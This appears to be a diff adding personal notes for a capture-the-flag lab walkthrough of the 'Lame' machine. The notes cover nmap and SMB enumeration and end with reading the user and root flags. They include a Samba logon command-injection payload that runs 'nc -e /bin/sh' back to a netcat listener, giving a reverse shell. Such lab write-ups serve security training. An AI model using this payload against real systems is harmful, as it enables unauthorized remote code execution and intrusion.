@@ -1,0 +1,30 @@
+LAME Walk Without Metasploit :-
+ - Spawn Machine -> Download VPN Configuration file
+ - Connect OpenVpn -> openvpn downloadfile_name.ovpn
+ - Scan Nmap :- nmap -sC -sV -T4 IP > filename_to_save
+ - Find Open Ports -> FTP-21 | SSH-22 | SAMBA-139,445 (Enumeration)
+ 
+ For Samba :-
+  - Provide service run on it | Access level :- smbmap -H IP 
+  - tmp has access read/writex1
+  - Anonymous access :- smbclient -L 10.10.10.3  
+  - Shown error :- NT_STATUS_CONNECTION_DISCONNECTED
+  - To solve    :- smbclient //IP/tmp --option='client min protocol=NT1'
+  - Enter you login successfully
+  - Samba most vulnerable to exploit it need Payload 
+  - Turn on listner netcat :- nc -lvnp 4444
+  - Logon protocol vulnerable :- logon "./=`nohup nc -e /bin/sh IP 4444`"
+  - We get connection on netcat
+  - Run Cmd command :- id
+  - Upgrade shell :- TTY Spawn Shell From HackTools
+  - Upgrade :- python -c 'import pty; pty.spawn("/bin/bash")'
+  - ls -> cd home -> ls -> cd makis -> ls -> user.txt 
+  - cd /root -> ls -> cat root.txt 
+
+
+Walk 2 :-
+ nmap -Pn -sVC  IP -oG save_output_directory(Enumeration)
+ 
+ 
+  
+  
